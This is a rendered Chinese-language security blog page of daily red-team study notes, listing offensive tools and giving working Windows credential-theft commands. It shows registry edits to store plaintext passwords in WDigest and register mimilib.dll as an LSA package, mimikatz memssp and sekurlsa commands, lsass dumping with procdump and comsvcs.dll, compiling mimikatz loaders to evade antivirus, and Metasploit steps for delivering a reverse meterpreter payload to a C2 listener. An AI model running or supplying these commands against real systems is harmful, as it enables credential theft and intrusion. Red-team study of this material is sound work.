@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  <meta name="author" content="Olist.213">
+  <meta name="description" content="一点牢骚">
+  
+  
+  <link rel="prev" href="https://olist213.github.io/study_book/time-2021-04-22/" />
+  <link rel="next" href="https://olist213.github.io/study_book/time-2021-04-26/" />
+  <link rel="canonical" href="https://olist213.github.io/study_book/time-2021-04-25/" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           Time 2021 04 25 | Olist.213
+       
+  </title>
+  <meta name="title" content="Time 2021 04 25 | Olist.213">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  
+  
+ 
+
+<script type="application/ld+json">
+ "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https:\/\/olist213.github.io"
+    },
+    "articleSection" : "study_book",
+    "name" : "Time 2021 04 25",
+    "headline" : "Time 2021 04 25",
+    "description" : "red-team\n  木马查杀工具-火绒恶性木马专杀工具\n  Windows \/ Linux Local Privilege Escalation Workshop\n  404 StarLink Project 2.0 - Galaxy\n Elkeid  Elkeid是一个云原生的基于主机的入侵检测解决方案。   linglong  一款甲方资产巡航扫描系统。系统定位是发现资产，进行端口爆破。   Glass  Glass是一款针对资产列表的快速指纹识别工具，通过调用Fofa\/ZoomEye\/Shodan\/360等api接口快速查询资产信息并识别重点资产的指纹，也可针对IP\/IP段或资产列表进行快速的指纹识别。   AppInfoScanner  一款适用于以HW行动\/红队\/渗透测试团队为场景的移动端(Android、iOS、WEB、H5、静态网站)信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态WEB站点中关键的资产信息并提供基本的信息输出,如：Title、Domain、CDN、指纹信息、状态信息等。   redis-rogue-server HackBrowserData  hack-browser-data 是一个解密浏览器数据（密码|历史记录|Cookies|书签）的导出工具，支持全平台主流浏览器的数据导出窃取。   antSword  中国蚁剑是一款开源的跨平台网站管理工具.   ServerScan  一款使用Golang开发且适用于攻防演习内网横向信息收集的高并发网络扫描、服务探测工具。   fscan  一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。   As-Exploits  中国蚁剑后渗透框架      获取Windows高版本明文密码",
+    "inLanguage" : "zh-cn",
+    "author" : "Grayash",
+    "creator" : "Grayash",
+    "publisher": "Grayash",
+    "accountablePerson" : "Grayash",
+    "copyrightHolder" : "Grayash",
+    "copyrightYear" : "2021",
+    "datePublished": "2021-04-25 09:17:27 \u002b0800 CST",
+    "dateModified" : "2021-04-25 09:17:27 \u002b0800 CST",
+    "url" : "https:\/\/olist213.github.io\/study_book\/time-2021-04-25\/",
+    "wordCount" : "333",
+    "keywords" : [ "每日学习", "Olist.213"]
+}
+</script>
+
+</head>
+
+  
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://olist213.github.io">Olist.213</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog&#39;s</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+                <a class="menu-item" href="/study_book/" title="">学习笔记Day</a>
+                
+                <a class="menu-item" href="/security_process/" title="">安全流程</a>
+                
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://olist213.github.io">Olist.213</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog&#39;s</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+                <a class="menu-item" href="/study_book/" title="">学习笔记Day</a>
+                
+                <a class="menu-item" href="/security_process/" title="">安全流程</a>
+                
+        </div>
+    </div>
+</nav>
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">Time 2021 04 25</h1>
+        <div class="post-meta">
+                Written by <a itemprop="name" href="https://olist213.github.io" rel="author">Grayash</a> with ♥ 
+                <span class="post-time">
+                on <time datetime=2021-04-25 itemprop="datePublished">April 25, 2021</time>
+                </span>
+                in
+                
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+            
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          <p><img src="/images/time-2021-04-25.assets/wallhaven-689985.jpg" alt="wallhaven-689985"></p>
+<hr>
+<ul>
+<li>
+<p><a href="https://dmcxblue.gitbook.io/red-team-notes-2-0/">red-team</a></p>
+</li>
+<li>
+<p><a href="https://bbs.huorong.cn/thread-18575-1-1.html">木马查杀工具-火绒恶性木马专杀工具</a></p>
+</li>
+<li>
+<p><a href="https://github.com/sagishahar-zz/lpeworkshop">Windows / Linux Local Privilege Escalation Workshop</a></p>
+</li>
+<li>
+<p><a href="https://github.com/knownsec/404StarLink2.0-Galaxy">404 StarLink Project 2.0 - Galaxy</a></p>
+<ul>
+<li><a href="https://github.com/bytedance/Elkeid">Elkeid</a>
+<ul>
+<li>Elkeid是一个云原生的基于主机的入侵检测解决方案。</li>
+</ul>
+</li>
+<li><a href="https://github.com/awake1t/linglong">linglong</a>
+<ul>
+<li>一款甲方资产巡航扫描系统。系统定位是发现资产，进行端口爆破。</li>
+</ul>
+</li>
+<li><a href="https://github.com/s7ckTeam/Glass">Glass</a>
+<ul>
+<li>Glass是一款针对资产列表的快速指纹识别工具，通过调用Fofa/ZoomEye/Shodan/360等api接口快速查询资产信息并识别重点资产的指纹，也可针对IP/IP段或资产列表进行快速的指纹识别。</li>
+</ul>
+</li>
+<li><a href="https://github.com/kelvinBen/AppInfoScanner">AppInfoScanner</a>
+<ul>
+<li>一款适用于以HW行动/红队/渗透测试团队为场景的移动端(Android、iOS、WEB、H5、静态网站)信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态WEB站点中关键的资产信息并提供基本的信息输出,如：Title、Domain、CDN、指纹信息、状态信息等。</li>
+</ul>
+</li>
+<li><a href="https://github.com/Dliv3/redis-rogue-server">redis-rogue-server</a></li>
+<li><a href="https://github.com/moonD4rk/HackBrowserData">HackBrowserData</a>
+<ul>
+<li>hack-browser-data 是一个解密浏览器数据（密码|历史记录|Cookies|书签）的导出工具，支持全平台主流浏览器的数据导出窃取。</li>
+</ul>
+</li>
+<li><a href="https://github.com/AntSwordProject/antSword">antSword</a>
+<ul>
+<li>中国蚁剑是一款开源的跨平台网站管理工具.</li>
+</ul>
+</li>
+<li><a href="https://github.com/Adminisme/ServerScan">ServerScan</a>
+<ul>
+<li>一款使用Golang开发且适用于攻防演习内网横向信息收集的高并发网络扫描、服务探测工具。</li>
+</ul>
+</li>
+<li><a href="https://github.com/shadow1ng/fscan">fscan</a>
+<ul>
+<li>一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。</li>
+</ul>
+</li>
+<li><a href="https://github.com/yzddmr6/As-Exploits">As-Exploits</a>
+<ul>
+<li>中国蚁剑后渗透框架</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>获取Windows高版本明文密码</p>
+<ul>
+<li>
+<p>改注册表（mimitaze存在免杀问题）-锁屏</p>
+<ul>
+<li>
+<p>修改成记录明文密码</p>
+</li>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">reg add HKLM<span style="color:#ae81ff">\S</span>YSTEM<span style="color:#ae81ff">\C</span>urrentControlSet<span style="color:#ae81ff">\C</span>ontrol<span style="color:#ae81ff">\S</span>ecurityProviders<span style="color:#ae81ff">\W</span>Digest /v UseLogonCredential /t REG_DWORD /d <span style="color:#ae81ff">1</span> /f
+</code></pre></div></li>
+<li>
+<p>修改不记录明文密码</p>
+</li>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">reg add HKLM<span style="color:#ae81ff">\S</span>YSTEM<span style="color:#ae81ff">\C</span>urrentControlSet<span style="color:#ae81ff">\C</span>ontrol<span style="color:#ae81ff">\S</span>ecurityProviders<span style="color:#ae81ff">\W</span>Digest /v UseLogonCredential /t REG_DWORD /d <span style="color:#ae81ff">0</span> /f
+</code></pre></div></li>
+<li>
+<p>锁屏</p>
+</li>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rundll32.exe user32.dll,LockWorkStation
+</code></pre></div></li>
+</ul>
+</li>
+<li>
+<p>mimikatz插ssp记录密码-锁屏</p>
+<ul>
+<li>
+<p>使用mimikatz的一个功能：</p>
+</li>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">privilege::debug、misc::memssp
+</code></pre></div></li>
+<li>
+<p>修改完之后使用以下命令锁屏，等用户进入后就可以在C:\Windows\System32\mimilsa.log里面存储登录的密码</p>
+</li>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rundll32.exe user32.dll,LockWorkStation
+</code></pre></div></li>
+</ul>
+</li>
+<li>
+<p>使用Invoke-Mimikatz.ps1-锁屏</p>
+<ul>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Import-Module .<span style="color:#ae81ff">\I</span>nvoke-Mimikatz.ps1 //导入命令
+Invoke-Mimikatz -Command <span style="color:#e6db74">&#34;misc::memssp&#34;</span> //不需要重启获取
+</code></pre></div></li>
+<li>
+<p>记录的明文密码存储在c:/windows/system32路径下</p>
+</li>
+</ul>
+</li>
+<li>
+<p>复制mimilib.dll+修改注册表-重启</p>
+<ul>
+<li>
+<p>在mimikatz中有32和64两个版本，安装包里分别都带有不同位数的mimilib.dll</p>
+</li>
+<li>
+<p>将对应版本的dll文件复制到 c:\windows\system32下</p>
+</li>
+<li>
+<p>将以下注册表位置中Security Packages的值设置为mimilib.dll</p>
+</li>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">reg add HKLM<span style="color:#ae81ff">\S</span>YSTEM<span style="color:#ae81ff">\C</span>urrentControlSet<span style="color:#ae81ff">\C</span>ontrol<span style="color:#ae81ff">\L</span>sa /v <span style="color:#e6db74">&#34;Security Packages&#34;</span> /t REG_MULTI_SZ /d mimilib.dll /f
+</code></pre></div></li>
+<li>
+<p>等待系统重启后，在c:\windows\system32生成文件kiwissp.log，记录当前用户的明文口令</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="https://cloud.tencent.com/developer/article/1656546">凭据收集总结</a></p>
+<ul>
+<li><a href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping">Credential Access &amp; Dumping 来源</a></li>
+</ul>
+</li>
+<li>
+<p><a href="https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki">Red-Team-Infrastructure-Wiki</a></p>
+<ul>
+<li>
+<p>重定向</p>
+<ul>
+<li>
+<p>socat for HTTP</p>
+</li>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">socat TCP4-LISTEN:80,fork TCP4:&lt;REMOTE-HOST-IP-ADDRESS&gt;:80
+</code></pre></div></li>
+<li>
+<p>iptables for HTTP</p>
+</li>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">iptables -I INPUT -p tcp -m tcp --dport <span style="color:#ae81ff">80</span> -j ACCEPT
+iptables -t nat -A PREROUTING -p tcp --dport <span style="color:#ae81ff">80</span> -j DNAT --to-destination &lt;REMOTE-HOST-IP-ADDRESS&gt;:80
+iptables -t nat -A POSTROUTING -j MASQUERADE
+iptables -I FORWARD -j ACCEPT
+iptables -P FORWARD ACCEPT
+sysctl net.ipv4.ip_forward<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</code></pre></div></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="https://github.com/sagishahar-zz/lpeworkshop">lpeworkshop</a></p>
+</li>
+<li>
+<p><a href="https://www.youtube.com/watch?v=FKUIPHpUSLc&amp;list=PLwIrqQCQ5pQn22nqNAaUk5OWoB1S1IFvt&amp;index=9">P9 教程九 Metasploit框架</a></p>
+</li>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Deliver Beacon with an Exploit？
+Use the metasploit Framework
+1. Pick a client-side exploit to use
+2. Set PayloAD to:
+windows/meterpreter/reversehttp【or..】
+windows/meterpreter/reversehttps
+3. Set LHOST and LPORT to your Beacon listener！
+4. Set Disable PayloadHandler to True
+5. Set PrependMigrate to True
+6. Run it with exploit -j
+</code></pre></div></li>
+<li>
+<p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E4%BB%8Elsass.exe%E8%BF%9B%E7%A8%8B%E5%AF%BC%E5%87%BA%E5%87%AD%E6%8D%AE">渗透基础——从lsass.exe进程导出凭据</a></p>
+<ul>
+<li>
+<p><del>1.使用mimikatz直接导出凭据</del></p>
+<ul>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">mimikatz.exe log <span style="color:#e6db74">&#34;privilege::debug&#34;</span> <span style="color:#e6db74">&#34;sekurlsa::logonPasswords full&#34;</span> exit
+</code></pre></div></li>
+</ul>
+</li>
+<li>
+<p>2.通过lsass.exe进程的dmp文件导出凭据</p>
+<ul>
+<li>
+<p>procdump</p>
+</li>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">procdump64.exe -accepteula -ma lsass.exe lsass.dmp
+</code></pre></div></li>
+<li>
+<p><a href="https://github.com/killswitch-GUI/minidump-lib">c++实现</a></p>
+</li>
+<li>
+<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1">powershell实现</a></p>
+</li>
+<li>
+<p><a href="https://github.com/GhostPack/SharpDump">c#实现</a></p>
+</li>
+<li>
+<p><a href="https://3gstudent.github.io/MiniDumpWriteDump-via-COM+-Services-DLL-%E7%9A%84%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95">使用comsvcs.dll</a></p>
+<ul>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">rundll32 C:\windows\system32\comsvcs.dll, MiniDump 808 C:\test\lsass.dmp full
+</code></pre></div></li>
+<li>
+<p>管理员权限的powershell下，默认支持<code>SeDebugPrivilege</code>权限，并且状态为<code>Enabled</code></p>
+</li>
+<li>
+<p><img src="/images/time-2021-04-25.assets/2-2.png" alt="Alt text"></p>
+</li>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell -c <span style="color:#e6db74">&#34;rundll32 C:\windows\system32\comsvcs.dll, MiniDump 808 C:\test\lsass.dmp full&#34;</span>
+</code></pre></div></li>
+<li>
+<p>如果想要dump指定进程的内存文件，可以使用新的方法，示例命令如下：</p>
+</li>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell -c <span style="color:#e6db74">&#34;rundll32 C:\windows\system32\comsvcs.dll, MiniDump 808 C:\test\lsass.dmp full&#34;</span>
+        
+其中comsvcs.dll可以替换为以下dll<span style="color:#960050;background-color:#1e0010">：</span>
+        
+C:\Windows\Syswow64\comsvcs.dll
+C:\Windows\winsxs\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_ceb756d4b98f01a4\comsvcs.dll
+C:\Windows\winsxs\x86_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_7298bb510131906e\comsvcs.dll
+</code></pre></div></li>
+<li>
+<p>获得指定dll的导出函数</p>
+</li>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Import-Module ./Get-AllExports.ps1
+$Path = <span style="color:#e6db74">&#39;C:\Windows&#39;</span>
+<span style="color:#66d9ef">ForEach</span>($file <span style="color:#66d9ef">in</span> (Get-ChildItem -recurse -Filter <span style="color:#e6db74">&#34;*.dll&#34;</span> -Path $Path  -ErrorAction SilentlyContinue )) 
+{
+<span style="color:#75715e">#   $file.PSPath.Substring($file.PSPath.IndexOf(&#34;:&#34;)+2)</span>
+    Get-Exports -DllPath $file.PSPath.Substring($file.PSPath.IndexOf(<span style="color:#e6db74">&#34;:&#34;</span>)+2)
+}
+</code></pre></div></li>
+<li>
+<p><a href="https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/">minidumpwritedump-via-com-services-dll</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="https://github.com/outflanknl/Dumpert">上述方法失效，参考-Dumpert</a></p>
+</li>
+<li>
+<p><a href="https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e">如果这种方法仍然失败，参考</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p>导出后，利用mimikatz读取密码</p>
+<ul>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">mimikatz.exe log <span style="color:#e6db74">&#34;sekurlsa::minidump lsass.dmp&#34;</span> <span style="color:#e6db74">&#34;sekurlsa::logonPasswords full&#34;</span> exit
+</code></pre></div></li>
+</ul>
+</li>
+<li>
+<p>使用c#实现的mimikatz直接导出凭据</p>
+<ul>
+<li>
+<p><a href="https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/PELoaderofMimikatz.cs">代码</a></p>
+</li>
+<li>
+<p>通过csc.exe对其进行编译，支持.Net 3.5以及更高版本</p>
+</li>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe PELoaderofMimikatz.cs /unsafe
+or
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe PELoaderofMimikatz.cs /unsafe
+      
+<span style="color:#75715e"># 导出的命令</span>
+PELoaderofMimikatz.exe log <span style="color:#e6db74">&#34;privilege::debug&#34;</span> <span style="color:#e6db74">&#34;sekurlsa::logonPasswords full&#34;</span> exit
+      
+<span style="color:#75715e">#使用InstallUtil.exe导出凭据</span>
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U PELoaderofMimikatzAuto.exe
+</code></pre></div></li>
+</ul>
+</li>
+<li>
+<p>使用c#实现的代码获得lsass.exe进程的dmp文件 - administrator权限</p>
+<ul>
+<li><a href="https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/DumpLsass.cs">代码</a></li>
+<li><img src="/images/time-2021-04-25.assets/image-20210426111722662.png" alt="image-20210426111722662"></li>
+<li><img src="/images/time-2021-04-25.assets/image-20210426111753474.png" alt="image-20210426111753474"></li>
+</ul>
+</li>
+<li>
+<p>限制下载文件长度时导出凭据的方法</p>
+<ul>
+<li>
+<p><a href="https://github.com/GhostPack/SafetyKatz">SafetyKatz</a></p>
+</li>
+<li>
+<p><a href="https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SafetyKatz.cs">代码</a></p>
+</li>
+<li>
+<p>编译</p>
+</li>
+<li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe SafetyKatz.cs /unsafe
+or
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe SafetyKatz.cs /unsafe
+</code></pre></div></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>使用pwdump7获取hash</p>
+<ul>
+<li>win7、Win03、window08</li>
+</ul>
+</li>
+<li>
+<p>getpassword.exe</p>
+<ul>
+<li>win2008</li>
+<li></li>
+</ul>
+</li>
+<li>
+<p><del>csc.exe文件编译</del></p>
+</li>
+</ul>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>Olist.213 </span>
+                </p>
+            
+           
+             
+            <p class="copyright-item">
+                    <span>Link:</span>
+                    <a href=https://olist213.github.io/study_book/time-2021-04-25/>https://olist213.github.io/study_book/time-2021-04-25/</span>
+            </p>
+            
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+            <section>
+            <i class="iconfont icon-tag"></i>Tag(s): 
+            
+            <span class="tag"><a href="https://olist213.github.io/tags/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0/">
+                    #每日学习</a></span>
+            
+            </section>
+        
+        <section>
+                <a href="javascript:window.history.back();">back</a></span> · 
+                <span><a href="https://olist213.github.io">home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://olist213.github.io/study_book/time-2021-04-22/" class="prev" rel="prev" title="Time 2021 04 22"><i class="iconfont icon-left"></i>&nbsp;Time 2021 04 22</a>
+         
+        
+        <a href="https://olist213.github.io/study_book/time-2021-04-26/" class="next" rel="next" title="Time 2021 04 26">Time 2021 04 26&nbsp;<i class="iconfont icon-right"></i></a>
+        
+    </div>
+
+    <div class="post-comment">
+          
+                 
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2018 - 2021</span>
+        
+        <span class="with-love">
+    	 <i class="iconfont icon-love"></i> 
+         </span>
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://olist213.github.io">Olist.213</a> | </span> 
+         
+
+         
+		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+     <link href="//lib.baomitu.com/lightgallery/1.6.11/css/lightgallery.min.css" rel="stylesheet">  
+      
+     <script src="/js/vendor_gallery.min.js" async="" ></script>
+    
+  
+
+
+
+     </div>
+  </body>
+</html>
